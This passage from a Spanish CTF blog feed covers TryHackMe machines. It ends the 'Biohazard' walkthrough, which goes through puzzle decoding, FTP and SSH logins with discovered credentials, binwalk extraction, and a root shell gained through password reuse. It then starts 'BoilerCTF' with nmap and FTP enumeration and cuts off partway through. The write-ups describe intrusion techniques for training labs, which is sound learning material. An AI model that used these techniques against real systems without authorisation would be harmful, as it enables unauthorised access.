Regresamos a &lt;code&gt;/diningRoom/&lt;/code&gt; nuevamente e ingresamos la &amp;ldquo;flag&amp;rdquo; del emblema de oro, nos devuelve un mensaje.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_173253.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Utilizamos &lt;a href=&#34;https://www.dcode.fr/cifrado-vigenere&#34;&gt;&lt;strong&gt;dcode.fr&lt;/strong&gt;&lt;/a&gt; para obtener el mansaje donde nos indica la pagina donde esta la &lt;code&gt;Shield key&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_174113.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Visitamos la pagina donde nos indica y vemos la &amp;ldquo;flag&amp;rdquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_174405.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En &lt;code&gt;/attic/&lt;/code&gt; nos pide ingresar el &lt;code&gt;Shield key&lt;/code&gt; que supuestamente esta incrustado en la puerta, al ingresar la &amp;ldquo;flag&amp;rdquo; nos redirige hacia otra pagina donde encontramos otra nota en donde encontramos otro crest.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_175023.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para obtener el crest 4.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_175115.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En &lt;code&gt;/tigerStatusRoom/&lt;/code&gt; nos pide una gema, ingresamos la &amp;ldquo;flag&amp;rdquo; &lt;code&gt;Blue Jewel&lt;/code&gt; y nos devuelve un mensaje donde se encuentra el crest 1.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_175455.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para obtener el crest 1.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_175540.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En &lt;code&gt;/armorRoom/&lt;/code&gt; nos pide tambien &lt;code&gt;Shield key&lt;/code&gt; ingresamos y tambien, encontramos una nota en la nueva pagina, en donde encontramos la ultima crest.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_180248.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para obtener el crest 3.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_180325.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;crests&#34;&gt;CRESTS&lt;/h2&gt;
&lt;p&gt;Una vez con todas las crest encontradas utilizamos la combinacion dada, al decodificar el mensaje nos muestra unas credenciales para el servicio FTP.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_180502.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Ingresamos por el servicio FTP con las credenciales que encontramos varios archivos entre ellos 3 imagenes jpg, un archivo de texto y una clave gpg.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/biohazard/tmp# ftp biohazard.thm 
Connected to biohazard.thm.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;biohazard.thm:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: hunter
&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
Password:
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
drwxrwxrwx    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; .
drwxrwxrwx    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1002&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; ..
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;7994&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; 001-key.jpg
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;2210&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; 002-key.jpg
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;2146&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; 003-key.jpg
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;121&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; helmet_key.txt.gpg
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;170&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; important.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;257&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt; is the current directory
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_181716.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#important.txt&lt;/span&gt; 

Jill,

I think the helmet key is inside the text file, but I have no clue on decrypting stuff. 
Also, I come across a /hidden_closet/ door but it was locked.

From,
Barry

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En una de las imagenes encontramos un archivo incrustado, pero al extraerlo y decodificarlo este no esta completo y seguramente el resto del mensaje esta en las imagenes restantes.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_181913.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la segunda imagen utilizamos &lt;code&gt;strings&lt;/code&gt; y en la tercera &lt;code&gt;binwalk&lt;/code&gt; para encontrar el mensaje restante.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_182116.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/biohazard/tmp# binwalk -e 003-key.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             0x0             JPEG image data, JFIF standard 1.01
&lt;span class=&#34;m&#34;&gt;1930&lt;/span&gt;          0x78A           Zip archive data, at least v2.0 to extract, uncompressed size: 14, name: key-003.txt
&lt;span class=&#34;m&#34;&gt;2124&lt;/span&gt;          0x84C           End of Zip archive, footer length: &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
root@upset:~/thm/biohazard/tmp# cat _003-key.jpg.extracted/key-003.txt 
3aXRoX3Zqb2x0
root@upset:~/thm/biohazard/tmp#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para obtener el mensaje completo, para obtener el mensaje en el archivo gpg.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_182402.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el mensaje o frase para obtener el mensaje, en donde encontramos la &amp;ldquo;flag&amp;rdquo; &lt;code&gt;Helmet Key&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_182616.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la &amp;ldquo;flag&amp;rdquo; en &lt;code&gt;/studyRoom/&lt;/code&gt; el cual nos redirige hacia una nueva pagina y donde encontramos un archivo tar, el contenido de este es un archivo de texto con un nombre de usuario.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_182856.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En &lt;code&gt;/hidden_closet/&lt;/code&gt; tambien nos pedia el &lt;code&gt;Helmet Key&lt;/code&gt; al ingresarlo encontramos una pagina donde vemos dos archivos de texto. El primer archivo contiene un mensaje codificado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#MO_DISK1.txt&lt;/span&gt;
wpbwbxr wpkzg pltwnhro, txrks_xfqsxrd_bvv_fy_rvmexa_ajk
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En el segundo archivo encontramos una contraseña para SSH.&lt;/p&gt;
&lt;h2 id=&#34;ssh---umbrella_guestweasker&#34;&gt;SSH - UMBRELLA_GUEST/WEASKER&lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales que encontramos y logramos obtener una shell con usuario umbrella_guest.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_183451.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Dentro de la maquina encontramos una nota donde vemos una comversacion entre Jill y Chris, donde mencionan el disco (archivo) &lt;code&gt;MO_DISK1.txt&lt;/code&gt; además una posible llave para el contenido de este y que esta cifrado. Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/#&#34;&gt;&lt;strong&gt;CyberCheff&lt;/strong&gt;&lt;/a&gt; para obtener el mensaje que contiene la contraseña del usuario &lt;code&gt;Weasker&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_183855.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion viendo el archivo &lt;code&gt;.history_bash&lt;/code&gt; y vemos que este usuario realizo el comando &lt;code&gt;sudo su&lt;/code&gt;, utilizamos su contraseña para verificar que no sea la misma para el usuario root y efectivamente es esa. Logramos obtener una shell root y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_184433.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;fail&#34;&gt;FAIL&lt;/h3&gt;
&lt;p&gt;Por alguna razon no logramos encontrar la flag &lt;code&gt;Emblem&lt;/code&gt;, pero esta se encuentra en &lt;code&gt;diningRoom&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/biohazard/Screenshot_20200811_185628.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/biohazard/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/biohazard/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
            
              <category>challenge</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - BoilerCTF</title>
        <link>https://sckull.github.io/posts/boilerctf/</link>
        <pubDate>Tue, 11 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 11 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/boilerctf/</guid>
        <description>BoilerCTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener las flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;BoilerCTF es una maquina de TryHackMe aqui encontrarás la solucion para obtener las flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Biohazard&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Intermediate level CTF&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;300&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/MrSeth6797&#34;&gt;MrSeth6797&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80), Webmin (10000) y el puerto ssh (55007) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Aug 11 21:20:00 2020 as: nmap -sV -o mini_scan boiler.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; boiler.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.29.145&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.25s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
80/tcp    open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
10000/tcp open  http    MiniServ 1.930 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Webmin httpd&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
55007/tcp open  unknown
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Aug 11 21:21:19 2020 -- 1 IP address (1 host up) scanned in 78.77 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para verificar SSH en el puerto 55007 utilizamos netcat.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/boilerctf# nc boiler.thm &lt;span class=&#34;m&#34;&gt;55007&lt;/span&gt;
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
^C
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Ingresamos en el servicio FTP con las credenciales anonymous, encontramos un archivo que contiene un mensaje cifrado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/boilerctf# ftp boiler.thm 
Connected to boiler.thm.
&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;boiler.thm:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -lah
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
